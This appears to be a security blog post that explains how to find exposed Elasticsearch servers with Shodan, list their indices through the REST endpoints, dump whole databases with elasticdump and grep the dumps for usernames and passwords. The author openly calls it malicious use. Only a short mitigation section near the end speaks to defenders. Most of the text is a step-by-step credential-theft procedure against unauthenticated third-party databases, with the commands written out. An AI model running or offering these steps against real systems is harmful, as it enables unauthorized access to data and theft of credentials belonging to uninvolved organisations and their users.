---
title: "Credential Hunting with Shodan via Elastidump"
date: 2021-10-18T16:16:30-04:00
categories:
  - Recon
tags:
  - Credential Hunting
  - Active/Passive Recon
  - Elastic Search
  - Elastidump
  - Shodan
---

## Credential Hunting with Shodan via Elastidump
Hello everyone, today we will be talking about how to get credentials without any effort. As everyone knows shodan is a huge scanner for internet assets. 

> The official definition of Shodan: `Shodan is a search engine for Internet-connected device.`

People use shodan to do some research or asset discovery. If you wonder, pentesters use it too. So, I want to explain how do I use this tool. (how to discover elastic targets on the Internet and how to exploit them)

### Shodan Queries

To get the most out of Shodan it's important to understand the search query syntax basically. Because at the end of the day, we will not need any target we need specifically wanted to.

Here are some basic queries for shodan:

> net: xxx.xxx.xxx.xxx/24

This particular query gives us subnet scan results. 

> port: xx 

This particular query gives us specific port scan results.

> country: XX (US or etc.)

This particular query gives us specific scan results for specific country.

> Product: XXX (elastic, MySQL etc.)

This particular query gives us exactly what product you search for.

All these keywords are enough for basic search and exploitation. Although in some situations, we need more targeted info. So, we can chain all keywords to search exactly what we need.

For example:

* `port: <elastic_port_number> country: <specific_country_code`
* `product: <elastic, MySQL> country: <specific_country_code>`

You can check more information on official shodan documents for searching ---> [Shodan  Search Query Fundamentals](https://help.shodan.io/the-basics/search-query-fundamentals)

### Some Elastic Queries on Web Browser (A.K.A REST APIs)

After a bit of searching on shodan, we can access some elasticsearch database pages.

On these pages, we saw some information about elasticsearch database. Yet this is not enough :) We need to enumerate the target elasticsearch database remotely with the browser via adding new directories.

We need to know following endpoints and their meanings:

* `/_cat`: This particular directory shows us usable paths. These paths are important for future enumeration steps.

* `/_cat/indices`: This particular directory shows us indices which are inside the elasticsearch databases. These indices include sensitive information, logs or etc.

* `/_cat/indices/<indice_name>`: This particular directory shows us target indices information. (What is the size of this directory or etc.)

* `/_cat/count`: This particular directory shows us count of data lines. For instance, if you use a Linux system you can calculate the line count with `wc -l` command, this one is exactly the same result.

* `/_cat/health`: This particular directory shows us health of the elasticsearch database.

You can search for more paths and meanings [here](https://www.elastic.co/guide/en/elasticsearch/reference/current/rest-apis.html).

##### PoC for Shodan.io and Web Queries:

> Product Keyword Usage:
![shodanquery](/assets/images/r-ss/shodan-general-search.png)

> Port 9200 - Landing: 
![landing](/assets/images/r-ss/shodan-web.png)

> Reading All Components:
![catall](/assets/images/r-ss/cat-all.png)

> Reading Indices:
![catindices](/assets/images/r-ss/cat-indices.png)

> Reading Spesific Indices:
> ![catindicesname](/assets/images/r-ss/cat-indices-with-name.png)
>
> ![catindicesname2](/assets/images/r-ss/cat-indices-with-name-2.png)

> Reading Health of Elastic:
![cathealth](/assets/images/r-ss/cat-health.png)

> Reading Data Line Count:
![catcount](/assets/images/r-ss/cat-count.png)

After a successful PoC, we need to reach inside the data. So, good news! we have a new part :)

### Dumping Data with Elasticdump

Elasticdump is a very simple and useful tool for dumping data. Normally, this tool is used to make developers' work easier, but in this case we can use it for malicious activity.

The tool is pretty simple. You can follow the below instructions for installation:

1. Do you have npm? (If the answer is no then follow)

```bash 
$ sudo apt install npm
```

2. Do you have elasticdump? (If the answer is no then follow)

```bash 
$ npm install elasticdump -g
```

3. Do you have jq? (If the answer is no then follow)

```bash 
$ sudo apt install jq
```

After installation, we need to dump target indices, then we can use either of following commands:

```bash 
$ elasticdump --input <http(s)://xx.xx.xx.xx:9200/> --output /home/x00/Desktop/test.json
```
or 
```bash 
$ elasticdump --input <http(s)://xx.xx.xx.xx:9200/indices_name> --output /home/x00/Desktop/test-2.json
```

> Is it done? Did I get all data from elasticsearch?
`Yes for sure :p but we need to eliminate (switching on to meaningful information) data inside the JSON file. `
> Why do I need to eliminate data? 
`Because the raw data is very complicated to use on any target. We need to use some little Linux commands to understand all data.`

##### PoC for elasticdump:

> General Usage of Elasticdump:
![elasticdump](/assets/images/r-ss/elasticdump-1.png)

> Results:
![elasticdumpresults](/assets/images/r-ss/elasticdump-results.png)
![elasticdumpresults](/assets/images/r-ss/elasticdump-results-2.png)

### Eliminating Raw Data to Meaningful Things

Actually, this part is pretty simple. You can `cat` the files of your need with `cut`, `grep`, and `awk` commands.

For example:

```bash
$ cat test.json | jq | grep -e "username" -e "password"
```

##### PoC for Data Elimination:

> Basic Grep with jq:
![grep](/assets/images/r-ss/grep.png)

> Extract `password2` Values:
![grep](/assets/images/r-ss/grep-2.png)

> Extract More:
![grep](/assets/images/r-ss/grep-results.png)

### Mitigation
The administrators can apply following suggestions:

* Do not use default ports like 9200 or etc.
* Put elasticsearch behind a firewall.
* Lock down HTTP API with authentication.

### Conclusion

As you can see how simple and effective it is. Any attacker can reach your database without any knowledge or effort. So this a huge risk for your company or project.

We need to minimise risk and secure the systems for a pure internet. Actually this is really simple. We need to focus hardening and beating practice guidelines. Also, we have to perform penetration tests periodically ;)

### References
* [Shodan.io](https://shodan.io/)
* [Shodan Query Basics](https://help.shodan.io/the-basics/search-query-fundamentals)
* [Elasticsearch REST APIs](https://www.elastic.co/guide/en/elasticsearch/reference/current/rest-apis.html)
* [Securing Elasticsearch](https://sematext.com/blog/elasticsearch-security-authentication-encryption-backup/)
* [Guide for Elasticdump](https://blog.logrocket.com/a-practical-guide-to-working-with-elasticdump/)
